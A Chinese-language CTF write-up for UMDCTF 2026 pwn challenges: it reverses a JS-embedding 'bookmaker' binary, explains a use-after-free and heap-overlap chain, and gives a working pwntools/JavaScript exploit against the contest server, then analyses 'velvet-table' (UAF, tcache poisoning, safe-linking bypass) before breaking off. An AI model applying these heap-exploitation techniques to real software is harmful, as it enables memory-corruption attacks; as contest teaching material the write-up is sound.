+<figure class="wp-block-image"><div class='fancybox-wrapper lazyload-container-unload' data-fancybox='post-images' href='https://cdn.yhalo.cn/UMDCTF2026/umdc18.png'><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  decoding="async" data-original="https://cdn.yhalo.cn/UMDCTF2026/umdc18.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20260429201659242"/></div></figure>
+
+
+
+<figure class="wp-block-image"><div class='fancybox-wrapper lazyload-container-unload' data-fancybox='post-images' href='https://cdn.yhalo.cn/UMDCTF2026/umdc19.png'><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  decoding="async" data-original="https://cdn.yhalo.cn/UMDCTF2026/umdc19.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20260429201722071"/></div></figure>
+
+
+
+<p class="wp-block-paragraph">main 前半段大块代码只是读脚本</p>
+
+
+
+<p class="wp-block-paragraph">分两种读脚本方法，一个是从文件读JS，另一个是直接从stdin读JS，直到遇到END_MARKET_SCRIPT</p>
+
+
+
+<p class="wp-block-paragraph">中间一段把 C 函数注册成 JS 里的全局方法</p>
+
+
+
+<p class="wp-block-paragraph">主要是两个特殊的构造函数，Ldeger和Wire,独树一帜和其他的注册函数明显不一样</p>
+
+
+
+<figure class="wp-block-image"><div class='fancybox-wrapper lazyload-container-unload' data-fancybox='post-images' href='https://cdn.yhalo.cn/UMDCTF2026/umdc20.png'><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  decoding="async" data-original="https://cdn.yhalo.cn/UMDCTF2026/umdc20.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20260504163400841"/></div></figure>
+
+
+
+<p class="wp-block-paragraph">这里看看off_C6D60,里面刚好放了4个字段，view ， recycle ，resize ，serial</p>
+
+
+
+<figure class="wp-block-image"><div class='fancybox-wrapper lazyload-container-unload' data-fancybox='post-images' href='https://cdn.yhalo.cn/UMDCTF2026/umdc21.png'><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  decoding="async" data-original="https://cdn.yhalo.cn/UMDCTF2026/umdc21.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20260504163840619"/></div></figure>
+
+
+
+<p class="wp-block-paragraph">推测这是一个方法表</p>
+
+
+
+<p class="wp-block-paragraph">重点看下js_Ledger_ctor，做了两次malloc分配，</p>
+
+
+
+<figure class="wp-block-image"><div class='fancybox-wrapper lazyload-container-unload' data-fancybox='post-images' href='https://cdn.yhalo.cn/UMDCTF2026/umdc22.png'><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  decoding="async" data-original="https://cdn.yhalo.cn/UMDCTF2026/umdc22.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20260504165450830"/></div></figure>
+
+
+
+<p class="wp-block-paragraph">第一次分配固定大小的ledger对象</p>
+
+
+
+<p class="wp-block-paragraph">第二次给用户可控大小的buf</p>
+
+
+
+<p class="wp-block-paragraph">看看js_help</p>
+
+
+
+<figure class="wp-block-image"><div class='fancybox-wrapper lazyload-container-unload' data-fancybox='post-images' href='https://cdn.yhalo.cn/UMDCTF2026/umdc23.png'><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  decoding="async" data-original="https://cdn.yhalo.cn/UMDCTF2026/umdc23.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20260504171006940"/></div></figure>
+
+
+
+<figure class="wp-block-image"><div class='fancybox-wrapper lazyload-container-unload' data-fancybox='post-images' href='https://cdn.yhalo.cn/UMDCTF2026/umdc24.png'><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  decoding="async" data-original="https://cdn.yhalo.cn/UMDCTF2026/umdc24.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20260504171139137"/></div></figure>
+
+
+
+<p class="wp-block-paragraph">关键的信息，可以把函数逻辑看到很清楚</p>
+
+
+
+<p class="wp-block-paragraph">重点再看看ledger.view()和ledger.recycle</p>
+
+
+
+<p class="wp-block-paragraph">ledger.view()把：原始地址 ledger-&gt;buf,原始长度 ledger-&gt;size</p>
+
+
+
+<p class="wp-block-paragraph">直接交给了 JS 包装函数</p>
+
+
+
+<p class="wp-block-paragraph">基于现有 native 内存创建 ArrayBuffer</p>
+
+
+
+<figure class="wp-block-image"><div class='fancybox-wrapper lazyload-container-unload' data-fancybox='post-images' href='https://cdn.yhalo.cn/UMDCTF2026/umdc25.png'><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  decoding="async" data-original="https://cdn.yhalo.cn/UMDCTF2026/umdc25.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20260504173004845"/></div></figure>
+
+
+
+<p class="wp-block-paragraph">如果 buf == NULL 或 size == 0,就报错：ledger has no buffer</p>
+
+
+
+<p class="wp-block-paragraph">也就是view() 会把这块 native buffer 直接暴露给 JS</p>
+
+
+
+<p class="wp-block-paragraph">然后是js_ledger_recycle</p>
+
+
+
+<figure class="wp-block-image"><div class='fancybox-wrapper lazyload-container-unload' data-fancybox='post-images' href='https://cdn.yhalo.cn/UMDCTF2026/umdc26.png'><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  decoding="async" data-original="https://cdn.yhalo.cn/UMDCTF2026/umdc26.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20260504173501289"/></div></figure>
+
+
+
+<p class="wp-block-paragraph">这里做了free(ledger-&gt;buf)，但是没有把buf=null，也没有把ledger-&gt;size=0</p>
+
+
+
+<p class="wp-block-paragraph">属于很明显的UAF漏洞，free了之后，旧 view 不失效，JS 侧仍然能通过旧 view 读写已释放内存</p>
+
+
+
+<p class="wp-block-paragraph">那基本的利用链就完整了，思路就是制造堆块重叠</p>
+
+
+
+<p class="wp-block-paragraph">Ledger(size)分配一个 native buf</p>
+
+
+
+<p class="wp-block-paragraph">ledger.view()返回一个直接 alias 到 buf JS buffer</p>
+
+
+
+<p class="wp-block-paragraph">ledger.recycle()对 buf 调 free</p>
+
+
+
+<p class="wp-block-paragraph">旧 view 不失效，JS 侧仍然能通过旧 view 读写已释放内存</p>
+
+
+
+<p class="wp-block-paragraph">mintWire()再申请一个 0x30 大小的 Wire 对象，复用这块 freed chunk</p>
+
+
+
+<p class="wp-block-paragraph">view 覆盖到 Wire，旧 view 现在读写的其实是 Wire 结构体，可以通过读sub_B390这个resolver来泄露pie基地址</p>
+
+
+
+<p class="wp-block-paragraph">后续改 Wire 的字段， qword_CC108 正好在&amp;unk_CC120前面 0x18 字节，所以：global_resolver = data_ptr &#8211; 0x18</p>
+
+
+
+<p class="wp-block-paragraph">接着把当前 Wire 的目标指针改成 qword_CC108，再把 backdoor地址覆写qword_CC108</p>
+
+
+
+<p class="wp-block-paragraph">最后全局resolver就可以跳到backdoor</p>
+
+
+
+<p class="wp-block-paragraph">exp</p>
+
+
+
+<pre class="wp-block-code"><code>from pwn import *<br>​<br>context(arch='amd64',os='linux',log_level='info')<br>context.binary = ELF("./bookmaker")<br>​<br>​<br>js = r"""<br>function r64(dv, off) {<br>  let v = 0;<br>  let m = 1;<br>  for (let i = 0; i &lt; 8; i++) {<br> &nbsp;  v += dv.getUint8(off + i) * m;<br> &nbsp;  m *= 256;<br>  }<br>  return v;<br>}<br>​<br>function w64(dv, off, v) {<br>  for (let i = 0; i &lt; 8; i++) {<br> &nbsp;  dv.setUint8(off + i, v &amp; 0xff);<br> &nbsp;  v = Math.floor(v / 256);<br>  }<br>}<br>​<br>function ab64(v) {<br>  let b = new ArrayBuffer(8);<br>  let d = new DataView(b);<br>  w64(d, 0, v);<br>  return b;<br>}<br>​<br>let ledger = new Ledger(48);<br>let view = ledger.view();<br>let dv = new DataView(view);<br>ledger.recycle();<br>​<br>let id = mintWire();<br>​<br>let data_ptr = r64(dv, 0);<br>let resolver = r64(dv, 24);<br>let pie = resolver - 0xb390;<br>let backdoor = pie + 0xb3c0;<br>let global_resolver = data_ptr - 0x18;<br>​<br>w64(dv, 0, global_resolver);<br>w64(dv, 8, 8);<br>wireWrite(id, ab64(backdoor));<br>settle("owned");<br>__END_MARKET_SCRIPT__<br>"""<br>​<br>io = remote("challs.umdctf.io", 30307)<br>io.send(js.encode())<br>​<br>io.interactive()<br>​<br>​</code></pre>
+
+
+
+<h2 class="wp-block-heading">velvet-table</h2>
+
+
+
+<pre class="wp-block-preformatted"> &nbsp; &nbsp;Arch: &nbsp; &nbsp; &nbsp; amd64-64-little<br> &nbsp; &nbsp;RELRO: &nbsp; &nbsp; &nbsp;Full RELRO<br> &nbsp; &nbsp;Stack: &nbsp; &nbsp; &nbsp;No canary found<br> &nbsp; &nbsp;NX: &nbsp; &nbsp; &nbsp; &nbsp; NX enabled<br> &nbsp; &nbsp;PIE: &nbsp; &nbsp; &nbsp; &nbsp;PIE enabled<br> &nbsp; &nbsp;FORTIFY: &nbsp; &nbsp;Enabled<br> &nbsp; &nbsp;SHSTK: &nbsp; &nbsp; &nbsp;Enabled<br> &nbsp; &nbsp;IBT: &nbsp; &nbsp; &nbsp; &nbsp;Enabled</pre>
+
+
+
+<p class="wp-block-paragraph">查看字符串发现bin/sh</p>
+
+
+
+<p class="wp-block-paragraph">顺着找到后门函数</p>
+
+
+
+<figure class="wp-block-image"><div class='fancybox-wrapper lazyload-container-unload' data-fancybox='post-images' href='https://cdn.yhalo.cn/UMDCTF2026/umdc27.png'><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  decoding="async" data-original="https://cdn.yhalo.cn/UMDCTF2026/umdc27.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20260505162148321"/></div></figure>
+
+
+
+<p class="wp-block-paragraph">看主函数</p>
+
+
+
+<p class="wp-block-paragraph">基本就是一个堆题菜单</p>
+
+
+
+<p class="wp-block-paragraph">去符号了，先把Seat_table的结构还原出来，再在ida里新建结构体逆一下就可以清晰点</p>
+
+
+
+<figure class="wp-block-image"><div class='fancybox-wrapper lazyload-container-unload' data-fancybox='post-images' href='https://cdn.yhalo.cn/UMDCTF2026/umdc28.png'><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  decoding="async" data-original="https://cdn.yhalo.cn/UMDCTF2026/umdc28.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20260508152310558"/></div></figure>
+
+
+
+<p class="wp-block-paragraph">选项2很明显的没有清指针，UAF漏洞</p>
+
+
+
+<figure class="wp-block-image"><div class='fancybox-wrapper lazyload-container-unload' data-fancybox='post-images' href='https://cdn.yhalo.cn/UMDCTF2026/umdc29.png'><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  decoding="async" data-original="https://cdn.yhalo.cn/UMDCTF2026/umdc29.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20260508194015476"/></div></figure>
+
+
+
+<p class="wp-block-paragraph">这个idx是输入的saeat于seat_key异或后再经过计算出来的，后面的选项也都是这样</p>
+
+
+
+<figure class="wp-block-image"><div class='fancybox-wrapper lazyload-container-unload' data-fancybox='post-images' href='https://cdn.yhalo.cn/UMDCTF2026/umdc30.png'><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  decoding="async" data-original="https://cdn.yhalo.cn/UMDCTF2026/umdc30.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20260508210615644"/></div></figure>
+
+
+
+<p class="wp-block-paragraph">seat_key来源</p>
+
+
+
+<figure class="wp-block-image"><div class='fancybox-wrapper lazyload-container-unload' data-fancybox='post-images' href='https://cdn.yhalo.cn/UMDCTF2026/umdc31.png'><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  decoding="async" data-original="https://cdn.yhalo.cn/UMDCTF2026/umdc31.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20260508211123090"/></div></figure>
+
+
+
+<p class="wp-block-paragraph">选项3相当于edit，更新chunk内容，但是这个copy_size给的可以输入非常大，有个开关是cancopy,初始默认值是0</p>
+
+
+
+<figure class="wp-block-image"><div class='fancybox-wrapper lazyload-container-unload' data-fancybox='post-images' href='https://cdn.yhalo.cn/UMDCTF2026/umdc32.png'><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  decoding="async" data-original="https://cdn.yhalo.cn/UMDCTF2026/umdc32.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20260508195201223"/></div></figure>
+
+
+
+<p class="wp-block-paragraph">选项4这里相当于show，它只检查了seat_table[idx].ptr，却没有看used，也就是说UAF读成立，只是读出来的是被加密混淆过的信息</p>
+
+
+
+<figure class="wp-block-image"><div class='fancybox-wrapper lazyload-container-unload' data-fancybox='post-images' href='https://cdn.yhalo.cn/UMDCTF2026/umdc33.png'><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  decoding="async" data-original="https://cdn.yhalo.cn/UMDCTF2026/umdc33.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20260509212317542"/></div></figure>
+
+
+
+<p class="wp-block-paragraph">secret也来自开头的v54地址混淆</p>
+
+
+
+<figure class="wp-block-image"><div class='fancybox-wrapper lazyload-container-unload' data-fancybox='post-images' href='https://cdn.yhalo.cn/UMDCTF2026/umdc34.png'><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  decoding="async" data-original="https://cdn.yhalo.cn/UMDCTF2026/umdc34.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20260509212947964"/></div></figure>
+
+
+
+<p class="wp-block-paragraph">选项6这里给了一个函数调用点，前置条件是count为奇数，而且需要让栈上的v56满足条件才能调用v55()</p>
+
+
+
+<figure class="wp-block-image"><div class='fancybox-wrapper lazyload-container-unload' data-fancybox='post-images' href='https://cdn.yhalo.cn/UMDCTF2026/umdc35.png'><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  decoding="async" data-original="https://cdn.yhalo.cn/UMDCTF2026/umdc35.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20260511193538734"/></div></figure>
+
+
+
+<p class="wp-block-paragraph">选项7的作用就是让之前选项3的cancopy的值变成1，开启开关，限制是count要大于6</p>
+
+
+
+<figure class="wp-block-image"><div class='fancybox-wrapper lazyload-container-unload' data-fancybox='post-images' href='https://cdn.yhalo.cn/UMDCTF2026/umdc36.png'><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  decoding="async" data-original="https://cdn.yhalo.cn/UMDCTF2026/umdc36.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20260508201235949"/></div></figure>
+
+
+
+<p class="wp-block-paragraph">count的处理在选项2的末尾，size不为256和384这两个特殊值就可以进到cashed_out,cashed_out分支就是让count+1</p>
+
+
+
+<figure class="wp-block-image"><div class='fancybox-wrapper lazyload-container-unload' data-fancybox='post-images' href='https://cdn.yhalo.cn/UMDCTF2026/umdc37.png'><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  decoding="async" data-original="https://cdn.yhalo.cn/UMDCTF2026/umdc37.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20260511194702497"/></div></figure>
+
+
+
+<p class="wp-block-paragraph">另外，每次malloc一次也会给count+2</p>
+
+
+
+<figure class="wp-block-image"><div class='fancybox-wrapper lazyload-container-unload' data-fancybox='post-images' href='https://cdn.yhalo.cn/UMDCTF2026/umdc38.png'><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  decoding="async" data-original="https://cdn.yhalo.cn/UMDCTF2026/umdc38.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20260511222339463"/></div></figure>
+
+
+
+<p class="wp-block-paragraph">开头这里给出了运行时的栈上局部变量v54地址的混淆，从而可以逆推出secret和seat_key</p>
+
+
+
+<figure class="wp-block-image"><div class='fancybox-wrapper lazyload-container-unload' data-fancybox='post-images' href='https://cdn.yhalo.cn/UMDCTF2026/umdc39.png'><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  decoding="async" data-original="https://cdn.yhalo.cn/UMDCTF2026/umdc39.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20260508201819211"/></div></figure>
+
+
+
+<p class="wp-block-paragraph">就能够解密选项4的内容和真正的idx</p>
+
+
+
+<p class="wp-block-paragraph">基本的利用链思路就是，先申请多个chunk让count满足条件，count要大于6的话需要4次malloc，把cancopy开关打开，利用UAF形成堆块投毒，其中需要绕一下safe-linking，让分配落到函数调用点v55()旁边，然后show展示出函数地址，用来算pie基址，接着利用update功能把函数的v55()和v56()一起覆盖了，v55()覆盖成后门地址，v56覆盖成满足条件的guard，最后选项6调用后门函数</p>
+
+
+
+<p class="wp-block-paragraph">看下leak的v54地址附近，+0x20偏移位置就是v55</p>
+
+
+
